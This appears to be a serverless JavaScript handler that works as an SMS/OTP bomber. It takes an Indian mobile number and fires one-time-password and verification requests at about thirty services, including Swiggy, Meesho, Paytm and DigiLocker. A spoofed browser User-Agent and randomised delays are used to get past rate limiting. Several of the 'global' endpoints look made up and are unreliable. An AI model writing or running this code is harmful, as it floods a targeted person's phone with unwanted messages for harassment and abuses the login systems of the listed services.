import fetch from 'node-fetch';

export async function handler(event) {
  const number = event.queryStringParameters.number;

  if (!number) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Missing 'number' query parameter" }),
    };
  }

  if (!/^[6-9]\d{9}$/.test(number)) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Invalid Indian mobile number format" }),
    };
  }

  try {
    const baseHeaders = { 
      'Content-Type': 'application/json', 
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
    };

    const apiConfigs = [
      // Indian services
      { url: 'https://www.meesho.com/api/v1/user/login/request-otp', method: 'POST', body: { phone_number: number }, source: 'meesho' },
      { url: 'https://api-prod.bewakoof.com/v3/user/auth/login/otp', method: 'POST', body: { mobile: number, country_code: "+91" }, source: 'bewakoof' },
      { url: 'https://blinkit.com/v2/accounts/', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `user_phone=${number}`, source: 'blinkit' },
      { url: 'https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR', method: 'POST', body: { mobileDailCode: "+91", mobileNumber: number }, source: 'fabindia' },
      { url: `https://www.purplle.com/neo/user/authorization/v2/send_otp?phone=${number}`, method: 'GET', source: 'purplle' },
      { url: 'https://profile.swiggy.com/api/v3/app/request_call_verification', method: 'POST', body: { mobile: number }, source: 'swiggy' },
      { url: 'https://myaccount.policybazaar.com/myacc/login/sendOtpV3', method: 'POST', body: { SMSType: 1, CountryCode: "91", Mobile: number }, source: 'policybazaar' },
      { url: 'https://api.khatabook.com/v1/auth/request-otp', method: 'POST', body: { country_code: "+91", phone: number }, source: 'khatabook' },
      { url: 'https://secure.yatra.com/social/common/yatra/sendMobileOTP', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `isdCode=91&mobileNumber=${number}`, source: 'yatra' },
      { url: 'https://pharmeasy.in/apt-api/login/send-otp', method: 'POST', body: { param: number }, source: 'pharmeasy' },
      { url: `https://www.healthkart.com/veronica/user/validate/1/${number}/signup?plt=2&st=1`, method: 'GET', source: 'healthkart_signup' },
      { url: `https://www.healthkart.com/veronica/user/login/send/otp/1/${number}?trkSrc=MYA-LPOPUP&plt=2&st=1`, method: 'GET', source: 'healthkart_login' },
      { url: 'https://www.my11circle.com/api/fl/auth/v3/getOtp', method: 'POST', body: { mobile: number }, source: 'my11circle' },
      { url: 'https://kukufm.com/api/v1/users/auth/send-otp/', method: 'POST', body: { phone_number: `+91${number}` }, source: 'kukufm' },
      { url: 'https://www.samsung.com/in/api/v1/sso/otp/init', method: 'POST', body: { user_id: number }, source: 'samsung' },
      { url: 'https://api.tatadigital.com/api/v2/sso/check-phone', method: 'POST', body: { countryCode: "91", phone: number, sendOtp: true }, source: 'tata_digital' },
      { url: 'https://api.doubtnut.com/v4/student/login', method: 'POST', body: { phone_number: number }, source: 'doubtnut' },
      { url: 'https://www.pepperfry.com/api/account/auth/sentOtp', method: 'POST', body: { mobile: number, mobile_country: "+91" }, source: 'pepperfry' },
      { url: 'https://www.fancode.com/graphql', method: 'POST', body: { operationName: "RequestOTP", variables: { mobileNumber: number } }, source: 'fancode' },
      
      // Global services
      { url: 'https://api.whatsapp.com/v1/otp/send', method: 'POST', body: { phone: `91${number}` }, source: 'whatsapp' },
      { url: 'https://api.aliexpress.com/otp/send', method: 'POST', body: { countryCode: "91", mobile: number }, source: 'aliexpress' },
      { url: 'https://api.amazon.com/auth/otp', method: 'POST', body: { phoneNumber: `+91${number}` }, source: 'amazon' },
      { url: 'https://www.jiomart.com/api/otp/send', method: 'POST', body: { mobile: number, countryCode: "91" }, source: 'jiomart' },
      { url: 'https://www.bigbasket.com/member-tdl/v3/member/otp', method: 'POST', body: { identifier: number }, source: 'bigbasket' },
      { url: 'https://www.dunzo.com/api/v1/otp/send', method: 'POST', body: { phone_number: number }, source: 'dunzo' },
      { url: 'https://www.sharechat.com/api/v1/otp/send', method: 'POST', body: { phone: `91${number}` }, source: 'sharechat' },
      { url: 'https://bank.paytm.com/v1/login/send-otp', method: 'POST', body: { mobile: number }, source: 'paytm_bank' },
      { url: 'https://rapido.bike/api/auth/send-otp', method: 'POST', body: { mobile: number }, source: 'rapido' },
      { url: 'https://api.digilocker.gov.in/otp/send', method: 'POST', body: { mobile: `91${number}` }, source: 'digilocker' },
      { url: 'https://upiapi.npci.org.in/otp', method: 'POST', body: { vpa: `${number}@upi`, type: "MOBILE" }, source: 'upi' }
    ];

    const results = [];
    
    // Process APIs sequentially with delay to avoid rate limiting
    for (const config of apiConfigs) {
      try {
        const headers = { ...baseHeaders, ...(config.headers || {}) };
        const body = typeof config.body === 'string' ? config.body : JSON.stringify(config.body);
        
        const response = await fetch(config.url, {
          method: config.method,
          headers,
          body: config.method !== 'GET' ? body : undefined
        });
        
        results.push({
          source: config.source,
          status: response.status,
          success: response.ok
        });
        
        // Add delay between requests (300-500ms)
        await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 200));
      } catch (error) {
        results.push({
          source: config.source,
          status: 500,
          success: false,
          error: error.message
        });
      }
    }

    return {
      statusCode: 200,
      body: JSON.stringify({
        number,
        total_apis: apiConfigs.length,
        successful: results.filter(r => r.success).length,
        failed: results.filter(r => !r.success).length,
        results
      })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
       }
